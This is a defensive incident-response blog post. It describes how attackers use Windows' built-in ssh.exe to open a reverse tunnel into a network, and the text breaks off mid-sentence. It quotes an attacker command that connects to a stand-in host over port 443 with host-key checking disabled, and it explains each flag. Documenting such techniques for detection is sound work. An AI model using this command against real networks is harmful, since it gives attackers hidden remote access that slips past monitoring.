---
title: Ssh… Don’t Tell Them I Am Not HTTPS: How Attackers Use SSH.exe as a Backdoor Into Your Network
url: https://www.blackhillsinfosec.com/ssh-dont-tell-them-i-am-not-https/
source: Black Hills Information Security
date: 2023-03-22
fetch_date: 2025-10-04T10:15:32.614495
---

# Ssh… Don’t Tell Them I Am Not HTTPS: How Attackers Use SSH.exe as a Backdoor Into Your Network

[![Black Hills Information Security, Inc.](https://www.blackhillsinfosec.com/wp-content/uploads/2025/03/BHIS_TEXT_BHIS.png)](https://www.blackhillsinfosec.com "Black Hills Information Security, Inc.")

[RSS](https://www.blackhillsinfosec.com/feed/)

* [All Services](https://www.blackhillsinfosec.com/services/)
  + [Complete Service Guide](https://www.blackhillsinfosec.com/services/complete-service-guide/)
  + [Active SOC](https://www.blackhillsinfosec.com/services/active-soc/)
  + [AI Security Assessments](https://www.blackhillsinfosec.com/services/ai-security-assessments/)
  + [Blockchain Security](https://www.blackhillsinfosec.com/services/blockchain-security/)
  + [Blue Team Services](https://www.blackhillsinfosec.com/services/blue-team-services/)
  + [Continuous Penetration Testing](https://www.blackhillsinfosec.com/services/antisoc/)
  + [High-Profile Risk Assessments](https://www.blackhillsinfosec.com/services/high-profile-risk-assessments/)
  + [Incident Response](https://www.blackhillsinfosec.com/services/incident-response/)
  + [Penetration Testing](https://www.blackhillsinfosec.com/services/)
* [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Email Sign-Up](https://mailchi.mp/blackhillsinfosec.com/bhis-sign-up)
* [About Us](https://www.blackhillsinfosec.com/who-we-are/)
  + [Security Consultants](https://www.blackhillsinfosec.com/about/security-analysts/)
  + [Admin](https://www.blackhillsinfosec.com/about/admin-staff/)
  + [SOC Team](https://www.blackhillsinfosec.com/about/soc-team/)
  + [BHIS Family of Companies](https://www.blackhillsinfosec.com/bhis-tribe-of-companies/)
* [Free Resources](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Blogs](https://www.blackhillsinfosec.com/blog/)
  + [Free Cybersecurity Tools](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Free Cybersecurity Webcasts](https://www.blackhillsinfosec.com/free_cybersecurity_webcasts/)
  + [Podcasts](https://podcasts.apple.com/us/podcast/black-hills-information-security/id1410835265)
  + [RITA](https://www.activecountermeasures.com/free-tools/rita/)
* [Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [BHIS & Antisyphon Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [WWHF Conference](https://wildwesthackinfest.com)
* [Online Community](https://blackhillsinfosec.com/community)
  + [Discord](https://discord.gg/BHIS)
  + [LinkedIn](https://www.linkedin.com/company/black-hills-information-security/)
  + [YouTube](https://www.youtube.com/c/BlackHillsInformationSecurity/videos)
  + [Bluesky](https://bsky.app/profile/bhinfosecurity.bsky.social)
  + [Twitter/X](https://twitter.com/BHinfoSecurity)
  + [Upcoming Events](https://blackhillsinfosec.com/events)
* [Fun Stuff](https://spearphish-general-store.myshopify.com/)
  + [Backdoors & Breaches](https://www.blackhillsinfosec.com/tools/backdoorsandbreaches/)
  + [Merch, Zines & More](https://spearphish-general-store.myshopify.com/)
  + [PROMPT# Zine](https://www.blackhillsinfosec.com/prompt-zine/)
  + [REKCAH](https://www.blackhillsinfosec.com/rekcah/)
  + [Books](https://www.blackhillsinfosec.com/tools/books/)

21
Mar
2023

[Blue Team](https://www.blackhillsinfosec.com/category/blue-team/), [C2](https://www.blackhillsinfosec.com/category/red-team/c2/), [Derek Banks](https://www.blackhillsinfosec.com/category/author/derek-banks/), [Hunt Teaming](https://www.blackhillsinfosec.com/category/blue-team/hunt-teaming/), [Incident Response](https://www.blackhillsinfosec.com/category/blue-team/incident-response/), [Informational](https://www.blackhillsinfosec.com/category/informational/)

# [Ssh… Don’t Tell Them I Am Not HTTPS: How Attackers Use SSH.exe as a Backdoor Into Your Network](https://www.blackhillsinfosec.com/ssh-dont-tell-them-i-am-not-https/)

[Derek Banks](https://www.blackhillsinfosec.com/team/derek-banks/) //

![](https://www.blackhillsinfosec.com/wp-content/uploads/2023/03/BLOG_chalkboard_00621-1024x576.jpg)

Living Off the Land Binaries, Scripts, and Libraries, known as LOLBins or LOLBAS, are legitimate components of an operating system that threat actors can use to achieve their goals during a campaign against your organization. They do this to try to avoid detection from endpoint protection products and as an alternative to writing custom malicious code.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2023/03/Picture5.jpg)

Credit (original art): Locust Years

In many cases these binaries are well known, the techniques documented, and (hopefully) the malicious use is detectable by security products or threat hunting processes. However, in a recent incident response engagement, we found a LOLBAS technique that did not fall in that category of well documented. In fact, the technique does not currently appear to be in the MITRE ATT&K framework.

The scenario was that the client had users report odd behavior on their laptops. There were fraudulent purchases made on personal accounts from their work system when they were not at work at the time.  When initially investigating, the client determined that there were Remote Desktop Protocol (RDP) connections from their domain controllers to the endpoints in question. Understandably, the client became very concerned and contacted BHIS for Incident Response assistance.

We deployed [Velociraptor](https://docs.velociraptor.app/) in the environment and started analyzing network connections to the internet. We found that on a handful of Windows servers, there was a very suspicious Secure Shell (SSH) command connected to an external IP address.

But wait! SSH on a Windows server? Isn’t that a Linux thing?

We have found on both penetration tests and incident response engagement that many still do not realize the impact of the decision [Microsoft made in 2018](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview) to include OpenSSH in Windows Server and Desktop OSes.

The old systems administrator in me likes the decision and thinks, “it’s about time I do not need a third party SSH client.” But the security analyst in me knows that SSH is an amazingly powerful and versatile tool. Threat actors know its power and versatility too. It is more capable than just logging in to a remote server and interactively running commands.

Take the command we found during this incident investigation for example:

`ssh.exe [[email protected]](/cdn-cgi/l/email-protection) -f -N -R 50000 -p 443 -o StrictHostKeyChecking=no`

In this SSH command, the attacker was establishing a SSH connection to the remote server at evil.com with a very specific intent in mind — a reverse tunnel into the victim network so that they can run their own commands against internal systems. This is accomplished with the flags used in this particular command:

* -f: The SSH command runs in the background. Used by the attacker to obfuscate their presence.
* -N: Do not execute a remote command. This is useful when just forwarding ports.
* -R: Specifies that the given port on the remote host is to be forwarded to the local host and port on the victim network. This works by allocating a socket to listen to a port on the remote side and whenever a connection is made to this port, the connection is forwarded over the secure channel and a connection is made to victim machine.  This makes it a SOCKS proxy.
* -p: The port used to connect outbound from the internal network to the remote host, in this case, TCP 443, commonly associated with HTTPS, not SSH.
* -o: Options for which there is no specific command line switch, in this case StrictHostKeyChecking=no.

The StrictHostKeyChecking=no option is used so that when the command is run, the SSH client does not ask to verify the server host key… you know, that message we all just answer ‘yes’ to when connecting to an SSH server. But why would the attacker do this?

They wante...